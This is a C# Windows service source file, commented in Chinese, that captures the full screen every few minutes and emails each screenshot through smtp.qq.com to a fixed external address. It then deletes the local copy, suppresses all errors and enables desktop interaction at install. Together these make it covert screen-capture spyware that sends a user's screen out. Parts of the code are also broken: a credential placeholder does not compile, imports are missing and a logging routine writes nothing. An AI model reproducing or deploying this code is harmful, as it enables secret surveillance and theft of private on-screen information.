using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Drawing;

namespace WindowsService2
{
    public partial class Service1 : ServiceBase
    {

        static DateTime time;

        [System.Runtime.InteropServices.DllImportAttribute("gdi32.dll")]

        private static extern bool BitBlt(
            IntPtr hdcDest, //目标设备的句柄
            int nXDest, // 目标对象的左上角的X坐标
            int nYDest, // 目标对象的左上角的X坐标
            int nWidth, // 目标对象的矩形的宽度
            int nHeight, // 目标对象的矩形的长度
            IntPtr hdcSrc, // 源设备的句柄
            int nXSrc, // 源对象的左上角的X坐标
            int nYSrc, // 源对象的左上角的X坐标
            System.Int32 dwRop // 光栅的操作值
        );

        [System.Runtime.InteropServices.DllImportAttribute("gdi32.dll")]

        private static extern IntPtr CreateDC(
            string lpszDriver, // 驱动名称
            string lpszDevice, // 设备名称
            string lpszOutput, // 无用，可以设定位"NULL"
            IntPtr lpInitData // 任意的打印机数据
        );

        public Service1()
        {
            InitializeComponent();
        }


        protected override void OnStart(string[] args)
        {
            time = DateTime.Now;
            System.Timers.Timer timer = new System.Timers.Timer(180000);
            timer.Elapsed += new System.Timers.ElapsedEventHandler(timer_Elapsed);
            timer.Enabled = true;
            timer.Start();
        }



        void timer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            if (DateTime.Now >= time)
            {
                time = time.AddMinutes(5);
                SendEmail();
            }
        }



        private void SendEmail()
        {
            try
            {
                #region 屏幕截屏
                Bitmap MyImage = null;
                IntPtr dc1 = CreateDC("DISPLAY", null, null, (IntPtr)null);
                //创建显示器的DC
                Graphics g1 = Graphics.FromHdc(dc1);
                //由一个指定设备的句柄创建一个新的Graphics对象
                MyImage = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, g1);
                //根据屏幕大小创建一个与之相同大小的Bitmap对象
                Graphics g2 = Graphics.FromImage(MyImage);

                //获得屏幕的句柄
                IntPtr dc3 = g1.GetHdc();
                //获得位图的句柄

                IntPtr dc2 = g2.GetHdc();
                //把当前屏幕捕获到位图对象中
                BitBlt(dc2, 0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, dc3, 0, 0, 13369376);
                //把当前屏幕拷贝到位图中

                g1.ReleaseHdc(dc3);
                //释放屏幕句柄
                g2.ReleaseHdc(dc2);
                //释放位图句柄

                string dir = Getdir();
                string path = dir + DateTime.Now.ToString("yyyyMMddHHmmss") + ".jpg";
                WriteLog(path);

                MyImage.Save(path, ImageFormat.Jpeg);
                #endregion

                #region 邮件发送程序
                SmtpClient mailClient = new SmtpClient("smtp.qq.com");



                //Credentials登陆SMTP服务器的身份验证.



                mailClient.Credentials = new NetworkCredential(qq邮箱, 密码);



                //test@qq.com发件人地址、test@163.com收件人地址
                MailMessage message = new MailMessage(new MailAddress("test@qq.com"), new MailAddress("test@163.com"));

                // message.Bcc.Add(new MailAddress("tst@qq.com")); //可以添加多个收件人


                //message.Body = "Hello Word!";//邮件内容
                message.Subject = DateTime.Now.ToString("yyyyMMddHHmmss");//邮件主题



                //Attachment 附件
                Attachment att = new Attachment(path);
                message.Attachments.Add(att);//添加附件           

                //发送

                mailClient.Send(message);
                if (File.Exists(path))
                    File.Delete(path);
                #endregion

            }

            catch (Exception e)
            {

            }

        }

        private string Getdir()
        {
            if (Directory.Exists("c:\\"))
                return "c:\\";
            else if (Directory.Exists("d:\\"))
                return "d:\\";
            else if (Directory.Exists("e:\\"))
                return "e:\\";
            else if (Directory.Exists("f:\\"))
                return "f:\\";
            else
                return "g:\\";
        }



        private void WriteLog(string message)
        {

            string path1 = Getdir() + "\\" + DateTime.Now.ToString("yyyy-MM") + ".txt";
            if (!File.Exists(path1))
            {
                File.CreateText(path1).Close();

            }
            using (FileStream fs = new FileStream(path1, FileMode.Append, FileAccess.Write))
            {
                StreamWriter sw = new StreamWriter(fs);
                sw.Flush();
                sw.Close();
                fs.Close();
            }
        }

        protected override void OnStop()
        {



        }

        /////该函数是为了windows服务和桌面交互
        private void serviceInstaller1_AfterInstall(object sender, InstallEventArgs e)
        {
            base.OnAfterInstall(e.SavedState);
            ManagementObject wmiService = null;
            ManagementBaseObject InParam = null;
            try
            {
                wmiService = new ManagementObject(string.Format("Win32_Service.Name='{0}'", serviceInstaller1.ServiceName));
                InParam = wmiService.GetMethodParameters("Change");
                InParam["DesktopInteract"] = true;
                wmiService.InvokeMethod("Change", InParam, null);
            }

            finally
            {
                if (InParam != null)
                    InParam.Dispose();
                if (wmiService != null)
                    wmiService.Dispose();
            }

        }
    }
}